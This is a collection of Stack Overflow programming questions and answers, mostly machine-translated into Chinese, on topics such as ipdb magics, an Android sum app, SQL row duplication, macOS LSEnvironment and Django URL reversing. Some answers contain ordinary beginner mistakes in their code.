> 标签：python, debugging, ipython

使用 调试 Python 脚本时`ipdb my_script.py`，我想在调试会话 shell中使用 IPython 魔术函数`%paste`，例如。是可能的以及如何？`%cd``ipdb`

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2015-01-15T20:29:14.470

根据[ipdb Github repo](https://github.com/gotcha/ipdb/issues/33)魔术 IPython 功能不可用。幸运的是，[IPython 调试器](https://github.com/ipython/ipython/blob/master/IPython/core/debugger.py#L521)提供了一些关于如何在不启动单独的 IPython shell 的情况下获得此功能的线索。

这是我运行的操作`%cpaste`：

```
ipdb> from IPython import get_ipython
ipdb> shell = get_ipython()
ipdb> shell.find_line_magic('cpaste')()
Pasting code; enter '--' alone on the line to stop or use Ctrl-D.
:for i in range(0,5):
:       print i
:--
0
1
2
3
4 
```

这样，您可以单步执行您的代码并通过方法访问所有 IPython 魔术函数`find_line_magic(your_magic_function)`。

* * *

## 回答 #2

> 赞同：19
> 
> 时间：2013-09-15T01:47:53.410

您可以在堆栈中打开 IPython shell，就像 pdb 一样。请执行下列操作：

*   从 IPython 导入 embed()，并将其放入您的代码中。
*   运行脚本

例子：

```
from IPython import embed

def some_func():
    i = 0
    embed()
    return 0 
```

**在 Python 外壳中**：

```
>>> te.func()

IPython 1.0.0 -- An enhanced Interactive Python.
(...)

In [1]: %whos

Variable   Type    Data/Info
i          int     0

In [2]: 
```

那是你要找的吗？

# android - Simple Math Android App Not Working

> ID：16184492
> 
> 赞同：0
> 
> 时间：2013-04-24T06:04:28.703
> 
> 标签：android, math

I am new to Android developing and I am trying to make a simple app as practice. All it consists of is you type one number into the first box, a number into the second box, press a button and the result prints into a textview. The problem is, when I press the send button Nothing is happening. Eclipse is not showing any errors, nor is LogCat. So I am officially stumped as to why when I run this I'm not getting anything out. Hopefully you guys can help.

Here is the XML:

```
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
xmlns:tools="http://schemas.android.com/tools"
android:layout_width="match_parent"
android:layout_height="match_parent"
android:paddingBottom="@dimen/activity_vertical_margin"
android:paddingLeft="@dimen/activity_horizontal_margin"
android:paddingRight="@dimen/activity_horizontal_margin"
android:paddingTop="@dimen/activity_vertical_margin"
tools:context=".MainActivity" >

<LinearLayout
    android:id="@+id/linearLayout1"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_alignParentBottom="true"
    android:layout_centerHorizontal="true"
    android:layout_marginBottom="172dp"
    android:orientation="vertical" >
</LinearLayout>

<TextView
    android:id="@+id/textView1"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_alignParentLeft="true"
    android:layout_alignParentTop="true"
    android:layout_marginLeft="16dp"
    android:layout_marginTop="48dp"
    android:text="First Number:"
    android:textAppearance="?android:attr/textAppearanceMedium" />

<TextView
    android:id="@+id/textView2"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_alignRight="@+id/textView1"
    android:layout_below="@+id/textView1"
    android:layout_marginTop="40dp"
    android:text="Second Number:"
    android:textAppearance="?android:attr/textAppearanceMedium" />

<EditText
    android:id="@+id/editText1"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_alignLeft="@+id/linearLayout1"
    android:layout_alignTop="@+id/textView1"
    android:ems="10"
    android:inputType="number" >

    <requestFocus />
</EditText>

<EditText
    android:id="@+id/editText2"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_alignTop="@+id/textView2"
    android:layout_toRightOf="@+id/linearLayout1"
    android:ems="10"
    android:inputType="number" />

<Button
    android:id="@+id/button1"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_alignRight="@+id/editText2"
    android:layout_below="@+id/editText2"
    android:text="Calc" />

<TextView
    android:id="@+id/textView3"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_above="@+id/linearLayout1"
    android:layout_centerHorizontal="true"
    android:text="TextView" />

</RelativeLayout> 
```

And here is the Java:

```
package com.example.mathbox;

import android.app.Activity;
import android.os.Bundle;
import android.view.Menu;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;

 public class MainActivity extends Activity { 

    Button sum;
    EditText num1, num2;
    TextView tv;

@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);
}
public boolean onCreateOptionsMenu(Menu menu) {
    // Inflate the menu; this adds items to the action bar if it is present.
    getMenuInflater().inflate(R.menu.main, menu);
    return true;
}

public void main(String[] args){

    num1 = (EditText) findViewById(R.id.editText1);
    num2 = (EditText) findViewById(R.id.editText2);
    tv = (TextView) findViewById(R.id.textView3);

num1.getText().toString();
num2.getText().toString();

    int x =Integer.parseInt("num1");
    int y =Integer.parseInt("num2");

    int nas = x + y;

    tv.setText(nas);

    findViewById(R.id.button1).setOnClickListener(new OnClickListener() {

        @Override
        public void onClick(View v) {}

});}} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-24T06:09:51.747

您正在解析错误的字符串..

```
num1.getText().toString();
num2.getText().toString();

int x =Integer.parseInt("num1");
int y =Integer.parseInt("num2"); 
```

您现在正在做的是将字符串“num1”和“num2”解析为字符串，我认为这不是您想要的。所以应该是：

```
int x = Integer.parseInt(num1.getText().toString());
int y = Integer.parseInt(num2.getText().toString()); 
```

并且像@AndroidEnthusiastic 建议的那样将代码移动到 onCreate() 方法中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-24T06:16:32.927

Hye Diamond，你做错了什么。没关系，你的初学者。看到您正在创建主要方法。在 java main 方法中`public static void main`首先执行，但是一旦创建了 oncreate 方法的活动就会执行。因此，您可以通过以下方式进行操作：

```
 //inside oncreate method do like this
  num1 = (EditText) findViewById(R.id.editText1);
num2 = (EditText) findViewById(R.id.editText2);
tv = (TextView) findViewById(R.id.textView3);
 findViewById(R.id.button1).setOnClickListener(new OnClickListener() {

    @Override
    public void onClick(View v) 
    {
   int val1 = num1.getText().toString();
   int val2 = num2.getText().toString();

int x =Integer.parseInt(val1);
int y =Integer.parseInt(val2);

int nas = x + y;

tv.setText(nas);
    } 
```

});

这可能对你有帮助。它没有经过测试。可能你必须做一些改变。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-24T06:35:36.863

找到这个代码..希望它有帮助

```
public class MainActivity extends Activity {

Button sum;
EditText num1, num2;
TextView tv;
String x;
String y;

@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);

    num1 = (EditText) findViewById(R.id.editText1);
    num2 = (EditText) findViewById(R.id.editText2);
    tv = (TextView) findViewById(R.id.textView3);
    sum = (Button) findViewById(R.id.button1);

    sum.setOnClickListener(new clicker());
}

class clicker implements Button.OnClickListener {
    public void onClick(View v) {

        Integer nas;
        x = num1.getText().toString();
        y = num2.getText().toString();
        nas = Integer.parseInt(x) + Integer.parseInt(y);
        tv.setText(nas.toString());
    }
}
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-24T06:12:34.280

```
public void main(String[] args) 
```

对于 Android，这是一个简单的方法，而不是应该是的入口点：

```
public static void main(String[] args) 
```

我看不到您在代码中调用 main 方法。

```
num1.getText().toString();
num2.getText().toString(); 
```

您只需获取值而不将其分配给任何属性。
这段代码是完全错误的。

我建议您从官方 Android 培训开始：[构建您的第一个应用程序](http://developer.android.com/training/basics/firstapp/index.html)。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-04-24T06:18:05.943

这是完整的解决方案

```
package com.example.mathbox;

import android.app.Activity;
import android.os.Bundle;
import android.view.Menu;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;

public class MainActivity extends Activity { 

    Button sum;
    EditText num1, num2;
    TextView tv;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        num1 = (EditText) findViewById(R.id.editText1);
        num2 = (EditText) findViewById(R.id.editText2);
        tv = (TextView) findViewById(R.id.textView3);

        Button button = (Button)findViewById(R.id.button1);
        button.setOnClickListener(new OnClickListener() {

            @Override
            public void onClick(View v) {
                // TODO Auto-generated method stub
                num1.getText().toString();
                num2.getText().toString();

                int x =Integer.parseInt("num1");
                int y =Integer.parseInt("num2");

                int nas = x + y;

                tv.setText(nas);
            }
        });
    }
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.main, menu);
        return true;
    }

} 
```

请看一下[这个链接](http://developer.android.com/reference/android/app/Activity.html)

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2013-04-24T06:09:51.493

请尝试此代码，

```
import android.app.Activity;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;

public class add extends Activity {
Button     button1;
 EditText   txtbox1,txtbox2;
 TextView tv;

  /** Called when the activity is first created. */
   @Override
public void onCreate(Bundle savedInstanceState) {
 super.onCreate(savedInstanceState);
 setContentView(R.layout.main);
 txtbox1=  (EditText) findViewById(R.id.txtbox1);
 button1 = (Button) findViewById(R.id.button1);
 tv = (TextView) findViewById(R.id.lbl1);
 txtbox2=  (EditText) findViewById(R.id.txtbox2);
 button1.setOnClickListener(new clicker());    
 }
class  clicker implements Button.OnClickListener
{           
public void onClick(View v)
{
 String a,b;
 Integer vis;
 a =  txtbox1.getText().toString();
 b =  txtbox2.getText().toString();    
 vis =  Integer.parseInt(a)+Integer.parseInt(b);    
 tv.setText(vis.toString());    
    }
    }
  } 
```

* * *

## 回答 #7

> 赞同：-1
> 
> 时间：2013-04-24T06:14:01.733

请不要使用 main 函数。这在活动课中并不是真正需要的，也不是一般做法。@AndroidEnthusiastic 给出了正确的代码。

补充：由于我的上述答案被否决了，我会继续告诉你你在代码中做错了什么（这里给出的其他答案中有很多代码）。

```
 num1 = (EditText) findViewById(R.id.editText1);
            num2 = (EditText) findViewById(R.id.editText2);
            tv = (TextView) findViewById(R.id.textView3);

        num1.getText().toString();//Store this in a string say a
        num2.getText().toString();//Store this in a string say b

    /*you're actually the passing the literal "num1" or "num2". Something which you don't want.
    Instead, pass the strings a and b instead of num1 and num2 respectively*/
            int x =Integer.parseInt("num1");
            int y =Integer.parseInt("num2");

            int nas = x + y;

            tv.setText(nas);

            findViewById(R.id.button1).setOnClickListener(new OnClickListener() {

                @Override
                public void onClick(View v) {
                /*You need to put the code here. i.e. You need to take the values from the
editTexts and store them in strings and finally integers when the button is clicked.*/
    }

        }); 
```

* * *

## 回答 #8

> 赞同：-1
> 
> 时间：2013-04-24T06:18:17.047

尝试这个，

```
int x =Integer.valueof(""+num1.getText().toString());
int y =Integer.valueof(""+num2.getText().toString());

int nas = x + y;

tv.setText(""+String.valueof(nas)); 
```

# sql - SQL Server Insert table into same table?

> ID：16184493
> 
> 赞同：0
> 
> 时间：2013-04-24T06:04:28.510
> 
> 标签：sql, sql-server

I am trying to create some **test data** for the project i am working on. At the moment I have about `64000` records in my table but I need more. My question is can i copy all these rows and insert them again ?

I have tried:

```
Select * INTO dbo.Calls from dbo.Calls 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-24T06:18:05.917

因为主键必须包含唯一值，不能包含 NULL 值。因此，如果您的表没有主键，请使用以下查询。

对于所有列使用：

```
INSERT INTO dbo.Calls SELECT * fROM  dbo.Calls 
```

对于选定的列使用：

```
 INSERT INTO dbo.Calls (<column name list>) SELECT  <column name list> FROM dbo.Calls 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-24T06:09:44.637

使用这个查询，以防你**没有**`primary key`它

```
insert into table_name
select * from table_name 
```

如果你有`primary key`然后使用这个

```
insert into table_name (col2,col3)
select col2,col3 from table_name 
```

# aforge - AForge Imaging 在图像中查找矩形

> ID：16184497
> 
> 赞同：1
> 
> 时间：2013-04-24T06:04:41.037
> 
> 标签：aforge, imaging

如果图像是在油漆中创建的，我可以找到矩形。我无法在 Sanp 拍摄或屏幕截图中找到矩形

它无法识别快照图像中的矩形...请帮助我

```
string path = "D:\\testc.png";
Bitmap image = (Bitmap)Bitmap.FromFile(path);

BlobCounter blobCounter = new BlobCounter();            
blobCounter.FilterBlobs = true;
blobCounter.MinHeight = 1;
blobCounter.MinWidth = 1;
blobCounter.ProcessImage(image);
Blob[] blobs = blobCounter.GetObjectsInformation();
var retcs = blobCounter.GetObjects(image,true);
SimpleShapeChecker shapeChecker = new SimpleShapeChecker(); 
foreach (var blob in blobs)
{
  List<IntPoint> edgePoints = blobCounter.GetBlobsEdgePoints(blob);
  List<IntPoint> cornerPoints;
  // use the shape checker to extract the corner points
  if (shapeChecker.IsQuadrilateral(edgePoints, out cornerPoints))
  {
     // only do things if the corners form a rectangle
     if (shapeChecker.CheckPolygonSubType(cornerPoints) == PolygonSubType.Rectangle)
     {
     // here i use the graphics class to draw an overlay, but you
     // could also just use the cornerPoints list to calculate your
     // x, y, width, height values.
     List<Point> Points = new List<Point>();
     foreach (var point in cornerPoints)
     {
       Points.Add(new Point(point.X, point.Y));
     }
     Graphics g = Graphics.FromImage(image);
     g.DrawPolygon(new Pen(Color.Red, 5.0f), Points.ToArray());
     image.Save("D:\\result.png");
     }
   }
 } 
```

# xaml - 对 Windows Phone 的 DesignerSerializationVisibility 支持

> ID：16184498
> 
> 赞同：1
> 
> 时间：2013-04-24T06:04:40.963
> 
> 标签：xaml, serialization, custom-controls, windows-phone

我想创建一个具有集合属性的自定义控件，并像这样使用：

```
<my:mycontrol>

  <my:ctlIem />

  <my:ctlIem />

  <my:ctlIem />

  ...

  </my:mycontrol/> 
```

我用谷歌搜索并找到了这篇[文章](https://stackoverflow.com/questions/7437004/how-to-make-a-user-control-property-of-type-collectionmyclass-editable-in-form)，但是当我按照它所说的编码时，编辑器返回了一个错误，`DesignerSerializationVisibility`没有找到。

那么，是`DesignerSerializationVisibility`不是 Windows Phone 不支持的属性？如果不支持，我该如何实现该功能？

# plugins - 用于 ASP 自动完成的记事本++

> ID：16184499
> 
> 赞同：1
> 
> 时间：2013-04-24T06:04:42.637
> 
> 标签：plugins, notepad++

有人知道我想在 Notepad++ 上为 ASP 获得一个类似于“自动完成”的插件吗，我尝试在 ./APIs 中添加一个 asp.xml 文件并且它正在工作，但是我如何才能像输入“ re”比我可以选择“response”，然后我输入“.”，它会显示一些关键字，就像“write”一样，我不需要输入“wr”？

我知道我可以在 Dreamweaver 上使用它，但我在 notepad++ 上找不到相同的插件

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-22T10:36:25.633

尝试`WebEdit`插件并在配置文件中添加自定义快捷方式，例如：

```
wr=write
re=response 
```

[在这里](https://stackoverflow.com/questions/3209143/how-to-use-hotkey-in-notepad-webedit-plugin)查看更多

# android - android中UTC时间的Base10 ASCII表示中的最大位数

> ID：16184502
> 
> 赞同：0
> 
> 时间：2013-04-24T06:05:04.997
> 
> 标签：android, utc

一个**4 字节**的长整数可以给出

> (2^(32) - 1) = 4294967295

**10位**

现在，*位置管理器*在*android*中给出的时间**目前是 13 位**长（如 1366588814000 ）。随着时间的推移，未来的位数会增加吗？我不知道android以什么**数据类型存储时间。**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-24T12:01:10.340

getTime() 的返回类型很长，如[文档](http://developer.android.com/reference/android/location/Location.html#getTime%28%29)中所述。所以你不必担心数字的长度。您始终可以将该时间转换为人类可读的形式，例如

```
long time = location.getTime();
Date date = new Date(time);

SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
String text = sdf.format(date);
System.out.println(text); 
```

# c# - Not able to set Color getting by ViewModel

> ID：16184504
> 
> 赞同：0
> 
> 时间：2013-04-24T06:05:11.390
> 
> 标签：c#, wpf

I am using following code -

```
<Label Grid.Row="0" Content="{Binding MyColor}">
  <Label.Background>
    <SolidColorBrush Color="{Binding MyColor}"></SolidColorBrush>
  </Label.Background>
</Label>

<Grid Grid.Row="1" Grid.Column="0">
  <ScrollViewer Name="MyScroll"
                Template="{DynamicResource MyScrollViewerControlTemplate}">
    <ListView Name="List1"
              BorderThickness="0"
              SelectedItem="{Binding Path=SelectedElement}"
              ItemsSource="{Binding Path=Elements}"
              Background="{StaticResource aColor}">

      <ListView.Resources>
        <ControlTemplate x:Key="SelectedTemplate"
                         TargetType="ListViewItem">
          <Border Cursor="Hand">
            <Border.Background>
              <SolidColorBrush Color="{Binding Path=myColor}">
              </SolidColorBrush>
            </Border.Background>
            <TextBlock Text="Test" />
          </Border>
        </ControlTemplate>
      </ListView.Resources>
    </ListView>
  </ScrollViewer>
</Grid> 
```

Here when I am using property myColor to set Background color for label, It is working fine but when I am doing the same in ListView it is not working.

What have I missed. Please suggest.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-24T06:28:56.853

我找到了答案。我在 ListView 中将 Elements 称为我的绑定源，它不能直接访问 myColor 属性。我需要在可视化树中向上搜索 DataContext 并需要引用它。

我使用了以下代码 -

```
<Border.Background>
  <SolidColorBrush
    Color="{Binding Path=DataContext.myColor, RelativeSource={RelativeSource FindAncestor,AncestorType={x:Type Grid}}}">
  </SolidColorBrush>
</Border.Background> 
```

我成功地获得了财产。

# macos - Set environment variable for the process before startup

> ID：16184505
> 
> 赞同：1
> 
> 时间：2013-04-24T06:05:13.000
> 
> 标签：macos, bash, shell, applescript

I have the following situation:

I have Mac OS bundle with application which uses some 3rd party dynamic libraries and those libraries depend on some environment variable, let's name it `ENV_VAR`. I want to set `ENV_VAR` to some value for my application only because if I set it for the whole system it may breaks some other apps. And it should work transparently to the user i.e. he just run my app from the Application folder by double clicking it. How can I achieve it?

NOTE: dynamic libraries are loaded before main functions starts hence setting this variable in the main doesn't help.

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-04-24T10:10:55.250

您可以将[密钥“LSEnvironment”](https://developer.apple.com/library/ios/documentation/general/Reference/InfoPlistKeyReference/Articles/LaunchServicesKeys.html#//apple_ref/doc/uid/TP40009250-SW9)添加到应用程序包的 Info.plist。该值可以是一个包含键和值字符串的字典，当您的应用程序由启动服务启动时（例如，从 Finder 或 Dock 但不是从终端），这些键值对将添加到环境中。

```
<key>LSEnvironment</key>
<dict>
    <key>ENV_VAR</key>
    <string>value</string>
</dict> 
```

然而，在我的测试中（在 Snow Leopard 上），测试起来有点不稳定，至少在编辑现有应用程序的 Info.plist 时是这样。基本上，Launch Services 在首次遇到应用程序时会缓存应用程序的 Info.plist 的这一部分，并且不一定会识别磁盘上的更改。您有时可以提示它重新读取 Info.plist，例如，复制应用程序包或暂时将其移动到不同的文件夹。当然，矫枉过正的解决方案是使用`lsregister`刷新和重建缓存：

```
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -kill -seed 
```

此缓存问题不会影响您的最终用户，只会影响您调整 Info.plist。此外，如果您在源 Info.plist 中进行更改，然后使用 Xcode 构建应用程序，它应该不会影响您。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-24T06:16:03.007

我不确定以下是否有效，因为我没有这样的应用程序可供尝试。这个想法是从终端设置环境变量，然后调用您的应用程序：

```
ENV_VAR=something open -a YourApplication 
```

# java - 将 ArrayOFByte 转换为 int []

> ID：16184506
> 
> 赞同：0
> 
> 时间：2013-04-24T06:05:16.420
> 
> 标签：java, android, bytearray

我有一个`ArrayOfByte`

```
Log.d(TAG, "arrayOfByte :"+arrayOfByte); // it will display arrayOfByte :[B@2b052c60

Log.d(TAG, "arrayOfByte :"+ Arrays.toString(arrayOfByte)); //it displays arrayOfByte :[1,1,2,1,3,3,3,2,0,0,0,0,0,0,0] 
```

现在我想把它`[1,1,2,1,3,3,3,2,0,0,0,0,0,0,0]`变成一些`int[ ] series`即：

```
 int[ ] series ={1,1,2,1,3,3,3,2,0,0,0,0,0,0,0} 
```

那么如何做到这一点呢？

我用了

```
 int[]intArray = new int[1024];
 intArray = ByteBuffer.wrap(arrayOfByte).asIntBuffer().array() 
```

但得到如下异常：

```
04-24 11:32:34.750: E/AndroidRuntime(4927): FATAL EXCEPTION: Thread-10
04-24 11:32:34.750: E/AndroidRuntime(4927): java.lang.UnsupportedOperationException
04-24 11:32:34.750: E/AndroidRuntime(4927): at java.nio.IntToByteBufferAdapter.protectedArray(IntToByteBufferAdapter.java:169)
04-24 11:32:34.750: E/AndroidRuntime(4927): at java.nio.IntBuffer.array(IntBuffer.java:109) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-24T06:11:22.190

如果这不起作用，请尝试对其进行硬编码：

```
int[] intArray = new int[arrayOfByte.length];
for(int i = 0; i < arrayOfByte.length; i++) intArray[i] = (int)arrayOfByte[i]; 
```

# php - 模仿在浏览器中打开页面，以便 ajax 可以在安排为 cron 作业时在服务器上运行

> ID：16184512
> 
> 赞同：0
> 
> 时间：2013-04-24T06:05:29.467
> 
> 标签：php, javascript, ajax, parallel-processing, server-side

我已经安排了一个运行的 cron 作业，它应该执行一些 ajax 调用，但它没有。它呈现的页面类似于下面的页面。我不能一个一个地执行每个脚本并等待响应，但是因为它们都保持很长时间，我需要异步执行它们。当我在本地主机上打开此页面时，它会呈现下面的 html，完美运行并通过 ajax 启动其他实例。但是当我把它放在我的在线服务器上并通过 curl 作为 cron 启动它时，ajax 不运行，页面只呈现。

```
<html lang="en">
    <head>
        <script type="text/javascript" src="./assets/jquery.js"></script>

    </head>
<body>

//execute some php here 

<script>
 var numberOfInstances = "4";
 var userId = ["82372","93823","28372","39823"];

 //Ajax call to url that is supposed to run for each user id
 function startAnotherInstance(i){
    $.ajax({            
                url: "./getreplies.php?instance="+i+"&userid="+userId[i],
                type: 'GET',
                data: null,
                success: function() {

                }
            }); 
    } 

//Initialize the number of instances
 for (i=0;i<numberOfInstances;i++){
    startAnotherInstance(i);
 }
</script>    

</body> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-24T06:09:40.610

那是因为 Javascript 引擎内置在您的浏览器中。CURL 不知道 Javascript 是什么。

您需要编写的称为“shell 脚本”，可以通过 cron 任务启动。

# django - Django UrlConf NoReverseMatch

> ID：16184515
> 
> 赞同：0
> 
> 时间：2013-04-24T06:05:37.087
> 
> 标签：django, forms, url

下面的代码`NoReverseMatch`只返回一个 on `browse_years`（第三个 urlconf）。我错过了什么？谢谢你的帮助！

```
url(r'^browse/things/(?P<thing>[\w-]+)/$', 'views.browse.things', name='browse_things'),
url(r'^browse/colors/(?P<color>[\w-]+)/$', 'views.browse.colors', name='browse_colors'),
url(r'^browse/years/(?P<year>\d+)/$', 'views.browse.years', name='browse_years'),

def browse(request):
    thing_list = Thing.objects.all()
    if request.method == 'POST':
        form1 = ThingBrowseForm(request.POST)
        form2 = ColorBrowseForm(request.POST)
        form3 = YearBrowseForm(request.POST)
        if form1.is_valid():
            thing = form1.cleaned_data['thing']
            return HttpResponseRedirect(reverse('browse_things', kwargs={'thing':thing}))
        elif form2.is_valid():
            color = form2.cleaned_data['color']
            return HttpResponseRedirect(reverse('browse_colors', kwargs={'color':color}))
        elif form3.is_valid():
            year = form3.cleaned_data['year']
            return HttpResponseRedirect(reverse('browse_years', kwargs={'year':year}))
    else:
        form1 = ThingBrowseForm()
        form2 = ColorBrowseForm()
        form3 = YearBrowseForm()
    return render(request, 'browse.html', {'form1':form1, 'form2':form2, 'form3':form3, 'thing_list':thing_list}) 
```

* * *

编辑：添加回溯

```
Traceback:
File "/lib/python2.7/django/core/handlers/base.py" in get_response
  111\.                         response = callback(request, *callback_args, **callback_kwargs)
File "/myproject/views/browse.py" in browse
  18\.       return HttpResponseRedirect(reverse('browse_colors', kwargs={'color':color}))
File "/lib/python2.7/django/core/urlresolvers.py" in reverse
  476\.     return iri_to_uri(resolver._reverse_with_prefix(view, prefix, *args, **kwargs))
File "/lib/python2.7/django/core/urlresolvers.py" in _reverse_with_prefix
  396\.                 "arguments '%s' not found." % (lookup_view_s, args, kwargs))

Exception Type: NoReverseMatch at /browse/
Exception Value: Reverse for 'browse_colors' with arguments '()' and keyword arguments '{'color': u''}' not found. 
```

* * *

编辑：添加了 forms.py 和模板

```
class ThingBrowseForm(forms.Form):
    thing = forms.ModelChoiceField(queryset=Thing.objects.all(), widget=forms.Select(attrs={'onchange': 'this.form.submit();'}))

class ColorBrowseForm(forms.Form):
    color = forms.ChoiceField(choices=COLORS_EMPTY, required=False, widget=forms.Select(attrs={'onchange': 'this.form.submit();'}))

class YearBrowseForm(forms.Form):
    year = forms.ChoiceField(choices=YEARS_EMPTY, widget=forms.Select(attrs={'onchange': 'this.form.submit();'}))

<form action='' method='post' enctype='multipart/form-data'>
{{ form1.as_p }}
{% csrf_token %}
</form>
<form action='' method='post' enctype='multipart/form-data'>
{{ form2.as_p }}
{% csrf_token %}
</form>
<form action='' method='post' enctype='multipart/form-data'>
{{ form3.as_p }}
{% csrf_token %}
</form> 
```

# c# - Is it possible to override names of model bound elements with attributes?

> ID：16184516
> 
> 赞同：0
> 
> 时间：2013-04-24T06:05:39.840
> 
> 标签：c#, asp.net-mvc

As I understandd MVC framework html helpers (TextBoxFor, EditorFor) use reflection for defining the names of input elements to provide reverse binding to the model. fo I got used to rather long identifier names for the sake of clarity: `FirstName`, `LastName` and many other examples.

Do standard helpers support any attribute whcih allow abstract from model member names?

For XML serialization we have attributes `XmlElement`, `XmlAttribute` where we can set the name of the element.

Thus I need something like this:

```
public class Person
{
    [Name("fn")]
    public string FirtsName {get;set;}

    [Name("ln")]
    public string LastName {get;set;}
} 
```

and now call to `Html.TextBoxFor( model => model.FirstName)` should give `<input id="fn" name="fn" type="text" value="" />`

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-24T06:07:23.447

> 标准助手是否支持任何允许模型成员名称抽象的属性？

不，他们没有。您可以编写自定义模型绑定器，或者按预期简单地命名视图模型的属性。

# video - 如何在 Windows Phone 8 上从视频文件 (.mp4) 创建缩略图？

> ID：16184521
> 
> 赞同：1
> 
> 时间：2013-04-24T06:06:11.733
> 
> 标签：video, windows-phone-8

我使用 AudioVideoCapture 设备录制视频，但无法获取录制视频的缩略图。请帮我！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-06-08T05:18:22.027

你可以试试这个。如果您使用的是 AudioVideoCaptureDevice api。在每帧捕获后进行以下事件（预览缩略图）调用。您可以选择任何您需要的框架。作为第一个。

```
private AudioVideoCaptureDevice VideoRecordingDevice;
VideoRecordingDevice.PreviewFrameAvailable += previewThumbnail;
bool DisablePreviewFrame = false;

private void previewThumbnail(ICameraCaptureDevice a, object b)
{
    if (!DisablePreviewFrame)
    {
        DisablePreviewFrame = true;
        int frameWidth = (int)VideoRecordingDevice.PreviewResolution.Width;
        int frameHeight = (int)VideoRecordingDevice.PreviewResolution.Height;
    }
    int[] buf = new int[frameWidth * frameHeight];
    VideoRecordingDevice.GetPreviewBufferArgb(buf);
    using (IsolatedStorageFile isoStoreFile = IsolatedStorageFile.GetUserStoreForApplication())
    {
        var fileName = "temp.jpg";

        if (isoStoreFile.FileExists(fileName))
            isoStoreFile.DeleteFile(fileName);
        using (IsolatedStorageFileStream isostream = isoStoreFile.CreateFile(fileName))
        {
            WriteableBitmap wb = new WriteableBitmap(frameWidth, frameWidth);
            Array.Copy(buf, wb.Pixels, buf.Length);
            wb.SaveJpeg(isostream, 120, 120, 0, 60);
            isostream.Close();
        }
    }
} 
```

# android - Image Squences AndEngine

> ID：16184523
> 
> 赞同：1
> 
> 时间：2013-04-24T06:06:15.933
> 
> 标签：android, andengine

I am very new to ANDENGINE. I am trying to work on animated sprites now at that time I have sprite animated object like `image1`, `image2` ,`image3` . In these images a sequence of animation will be performed . Now in ANDENGINE for animation `TiledTextureRegion` is used which use only one image in which sprite animations are given like image below so is there any way to run a sprites animation using image sequences. I searched a lot on it, but it appears that there is very few information on that topic because andengine give ease but at that time I have to do that, and I am unable to think that how to start or use any method to achieve this.

![enter image description here](https://i.stack.imgur.com/PzbqY.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-24T20:02:22.673

您可以从文件夹创建 TiledTextureRegion。下面的示例从文件夹“person”加载所有图像，因为它是一个人的步行周期。

```
BuildableBitmapTextureAtlas texture = new BuildableBitmapTextureAtlas(engine.getTextureManager(), 256, 64);                     
personTextureRegion = BitmapTextureAtlasTextureRegionFactory.createTiledFromAssetDirectory(texture, context.getAssets(), "person");
try {
        texture.build(new BlackPawnTextureAtlasBuilder<IBitmapTextureAtlasSource, BitmapTextureAtlas>(0, 1, 4));
        texture.load();
} catch (TextureAtlasBuilderException e) {
        Debug.e(e);
} 
```

图像将按字母顺序添加。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-24T07:12:18.543

正如我得到你的问题一样，你不能用几个单独的图像播放动画。您应该只使用一个平铺图像来实现单个精灵的动画。上图可以播放跑步动画。为什么你要结合单个精灵来制作动画？

对于上面的图像动画，您可以使用

```
 yourSprite.animate(new long[] { 110, 110, 110, 110 ,110 }, 0, 4, true); 
```

在这个动画方法中，您有四个参数。第一个参数负责每个平铺动画的持续时间，第二个参数（这里：0）是平铺精灵的起始索引，第三个参数，（这里：4）是平铺的最后一个索引。第四个参数是循环动画的布尔值。

注意：我在这里忽略了您在上图中平铺的第二行。快乐编码:)

# c# - Finding .NET specification

> ID：16184530
> 
> 赞同：5
> 
> 时间：2013-04-24T06:07:03.540
> 
> 标签：c#, java, .net, jakarta-ee

Are there a public set of specifications for a given .NET release?

In our product development, we have used large parts of Java EE since J2EE 1.3 for some of the products. Even though the platform is large, it has always been easy to find what is included in a given release. Both Java SE and Java EE are a set of specifications. Several vendors offers implementations of the specifications. This works remarkably good.

